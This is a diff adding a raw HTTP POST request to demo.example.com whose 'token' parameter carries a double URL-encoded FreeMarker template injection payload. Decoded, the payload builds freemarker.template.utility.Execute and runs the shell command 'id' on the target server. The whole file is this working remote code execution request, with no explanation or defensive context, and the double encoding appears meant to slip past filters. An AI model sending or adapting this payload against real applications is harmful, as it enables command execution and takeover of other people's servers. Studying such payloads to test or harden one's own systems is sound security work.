@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Connection: close
+
+token=%253C%2523assign%2Bex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E%2524%257Bex%2528%2522id%2522%2529%257D
